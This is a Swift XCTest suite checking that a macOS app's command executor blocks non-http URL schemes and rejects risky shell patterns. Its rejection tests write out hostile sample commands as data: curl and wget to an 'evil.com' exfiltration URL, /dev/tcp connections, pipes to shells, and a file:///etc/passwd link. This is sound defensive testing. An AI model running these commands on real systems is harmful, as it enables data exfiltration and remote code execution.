import XCTest
@testable import ControllerKeys

/// Tests for security hardening of SystemCommandExecutor:
/// - URL scheme validation in openLink()
/// - Shell command logging and input validation in executeSilently()
///
/// Rejection tests use marker files: the command attempts to create a temp file,
/// then the test asserts the file was NOT created (proving the command was rejected).
/// Safe-command tests assert the marker file IS created (proving execution occurred).
@MainActor
final class SystemCommandExecutorSecurityTests: XCTestCase {
    private var profileManager: ProfileManager!
    private var testConfigDirectory: URL!
    private var openedURLs: [URL] = []
    private var executor: SystemCommandExecutor!

    /// Sleep duration to let async executeSilently() run on its execution queue
    private static let executionDelay: UInt64 = 300_000_000 // 300ms

    override func setUp() async throws {
        try await super.setUp()
        testConfigDirectory = FileManager.default.temporaryDirectory
            .appendingPathComponent("controllerkeys-security-tests-\(UUID().uuidString)", isDirectory: true)
        profileManager = ProfileManager(configDirectoryOverride: testConfigDirectory)
        openedURLs = []

        executor = SystemCommandExecutor(
            profileManager: profileManager,
            appURLResolver: { _ in nil },
            appOpener: { _, _, completion in completion(nil, nil) },
            urlOpener: { [weak self] url in
                self?.openedURLs.append(url)
            },
            appleScriptRunner: { _ in nil },
            newWindowShortcutSender: {}
        )
    }

    override func tearDown() async throws {
        executor = nil
        profileManager = nil
        testConfigDirectory = nil
        try await super.tearDown()
    }

    /// Create a unique marker file path for this test
    private func markerPath() -> String {
        "/tmp/controllerkeys-test-\(UUID().uuidString)"
    }

    // MARK: - openLink URL Scheme Validation

    func testOpenLink_AllowsHTTPS() async {
        executor.execute(.openLink(url: "https://example.com"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertEqual(openedURLs.count, 1)
        XCTAssertEqual(openedURLs.first?.absoluteString, "https://example.com")
    }

    func testOpenLink_AllowsHTTP() async {
        executor.execute(.openLink(url: "http://example.com"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertEqual(openedURLs.count, 1)
        XCTAssertEqual(openedURLs.first?.absoluteString, "http://example.com")
    }

    func testOpenLink_PrependsHTTPSWhenNoScheme() async {
        executor.execute(.openLink(url: "example.com"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertEqual(openedURLs.count, 1)
        XCTAssertEqual(openedURLs.first?.absoluteString, "https://example.com")
    }

    func testOpenLink_BlocksFileScheme() async {
        executor.execute(.openLink(url: "file:///etc/passwd"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertTrue(openedURLs.isEmpty, "file:// URLs must be blocked by openLink")
    }

    func testOpenLink_BlocksFTPScheme() async {
        executor.execute(.openLink(url: "ftp://ftp.example.com/file"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertTrue(openedURLs.isEmpty, "ftp:// URLs must be blocked by openLink")
    }

    func testOpenLink_BlocksTelScheme() async {
        executor.execute(.openLink(url: "tel:+15551234567"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertTrue(openedURLs.isEmpty, "tel: URLs must be blocked by openLink")
    }

    func testOpenLink_BlocksJavascriptScheme() async {
        executor.execute(.openLink(url: "javascript:alert(1)"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertTrue(openedURLs.isEmpty, "javascript: URLs must be blocked by openLink")
    }

    func testOpenLink_BlocksDataScheme() async {
        executor.execute(.openLink(url: "data:text/html,<h1>test</h1>"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertTrue(openedURLs.isEmpty, "data: URLs must be blocked by openLink")
    }

    func testOpenLink_BlocksSSHScheme() async {
        executor.execute(.openLink(url: "ssh://user@host"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertTrue(openedURLs.isEmpty, "ssh: URLs must be blocked by openLink")
    }

    func testOpenLink_CaseInsensitiveSchemeCheck() async {
        // HTTP in uppercase should still be allowed
        executor.execute(.openLink(url: "HTTP://example.com"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertEqual(openedURLs.count, 1, "HTTP (uppercase) should be allowed")
    }

    func testOpenLink_CaseInsensitiveSchemeBlocksMixedCaseFTP() async {
        executor.execute(.openLink(url: "FtP://ftp.example.com"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertTrue(openedURLs.isEmpty, "FtP:// (mixed case) must be blocked")
    }

    func testOpenLink_InvalidURLDoesNotOpen() async {
        executor.execute(.openLink(url: "http://[::1"))
        try? await Task.sleep(nanoseconds: 50_000_000)

        XCTAssertTrue(openedURLs.isEmpty, "Invalid URL should not trigger opener")
    }

    // MARK: - executeSilently: Safe Commands Execute (marker file IS created)

    func testShellCommand_SafeCommandExecutes() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker)", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertTrue(FileManager.default.fileExists(atPath: marker),
                       "Safe command should execute and create the marker file")
        try? FileManager.default.removeItem(atPath: marker)
    }

    func testShellCommand_StderrIsCaptured() async {
        // Run a command that writes to stderr and also creates a marker file.
        // Since stderr is piped (not /dev/null), the process should complete without hanging.
        let marker = markerPath()
        executor.execute(.shellCommand(command: "echo 'error output' >&2 && touch \(marker)", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertTrue(FileManager.default.fileExists(atPath: marker),
                       "Command writing to stderr should still execute fully")
        try? FileManager.default.removeItem(atPath: marker)
    }

    func testShellCommand_NonZeroExitDoesNotCrash() async {
        // /usr/bin/false always exits with status 1 — should not crash executor
        let marker = markerPath()
        executor.execute(.shellCommand(command: "/usr/bin/false", inTerminal: false))
        // Follow up with a safe command to verify executor is still functional
        executor.execute(.shellCommand(command: "touch \(marker)", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertTrue(FileManager.default.fileExists(atPath: marker),
                       "Executor should remain functional after a non-zero exit command")
        try? FileManager.default.removeItem(atPath: marker)
    }

    // MARK: - executeSilently: Dangerous Pattern Rejection (marker file NOT created)

    func testShellCommand_RejectsEmptyCommand() async {
        // Empty command is rejected before Process.run(), so nothing executes
        executor.execute(.shellCommand(command: "", inTerminal: false))
        try? await Task.sleep(nanoseconds: 100_000_000)
        // No marker to check — empty command can't create one. Verify no crash.
    }

    func testShellCommand_RejectsWhitespaceOnlyCommand() async {
        executor.execute(.shellCommand(command: "   \n\t  ", inTerminal: false))
        try? await Task.sleep(nanoseconds: 100_000_000)
        // No marker to check — whitespace command can't create one. Verify no crash.
    }

    func testShellCommand_RejectsBacktickSubstitution() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) && echo `whoami`", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Command with backtick substitution should be rejected and not execute")
    }

    func testShellCommand_RejectsDollarParenSubstitution() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) && echo $(whoami)", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Command with $() substitution should be rejected and not execute")
    }

    func testShellCommand_RejectsPipeToShell() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) | sh", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Pipe to sh should be rejected and not execute")
    }

    func testShellCommand_RejectsPipeToBash() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) | bash", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Pipe to bash should be rejected and not execute")
    }

    func testShellCommand_RejectsPipeToZsh() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) | zsh", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Pipe to zsh should be rejected and not execute")
    }

    func testShellCommand_RejectsPipeToShellNoSpace() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker)|sh", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Pipe to sh (no space) should be rejected and not execute")
    }

    func testShellCommand_RejectsPipeToAbsoluteShellPath() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) | /bin/sh", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Pipe to /bin/sh should be rejected and not execute")
    }

    func testShellCommand_RejectsChainedCurl() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker); curl http://evil.com/exfil?data=secret", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Chained curl should be rejected and not execute")
    }

    func testShellCommand_RejectsChainedWget() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker); wget http://evil.com/payload", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Chained wget should be rejected and not execute")
    }

    func testShellCommand_RejectsConditionalCurl() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) && curl http://evil.com", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Conditional curl should be rejected and not execute")
    }

    func testShellCommand_RejectsConditionalWget() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) && wget http://evil.com", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Conditional wget should be rejected and not execute")
    }

    func testShellCommand_PatternDetectionIsCaseInsensitive() async {
        let marker = markerPath()
        // Should block even with mixed case
        executor.execute(.shellCommand(command: "touch \(marker) | BASH", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Case-insensitive pattern matching should reject | BASH and not execute")
    }

    func testShellCommand_RejectsPipeToNode() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) | node -e 'process.exit()'", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Pipe to node should be rejected and not execute")
    }

    func testShellCommand_RejectsPipeToOsascript() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) | osascript -e 'quit'", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Pipe to osascript should be rejected and not execute")
    }

    func testShellCommand_RejectsShellVariableExpansion() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) && echo ${SHELL}", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Shell variable expansion ${} should be rejected and not execute")
    }

    func testShellCommand_RejectsHeredoc() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) && cat <<EOF\nhello\nEOF", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "Heredoc should be rejected and not execute")
    }

    func testShellCommand_RejectsDevTcp() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker) && cat /dev/tcp/evil.com/80", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertFalse(FileManager.default.fileExists(atPath: marker),
                        "/dev/tcp/ should be rejected and not execute")
    }

    // MARK: - executeSilently: Valid Commands That Resemble Patterns But Are Safe

    func testShellCommand_AllowsSimpleEchoCommand() async {
        // "echo hello" does not match any dangerous pattern
        let marker = markerPath()
        executor.execute(.shellCommand(command: "echo hello && touch \(marker)", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertTrue(FileManager.default.fileExists(atPath: marker),
                       "Simple echo command should be allowed to execute")
        try? FileManager.default.removeItem(atPath: marker)
    }

    func testShellCommand_AllowsPathWithoutDangerousPatterns() async {
        let marker = markerPath()
        executor.execute(.shellCommand(command: "touch \(marker)", inTerminal: false))
        try? await Task.sleep(nanoseconds: Self.executionDelay)

        XCTAssertTrue(FileManager.default.fileExists(atPath: marker),
                       "Safe path commands should be allowed to execute")
        try? FileManager.default.removeItem(atPath: marker)
    }
}
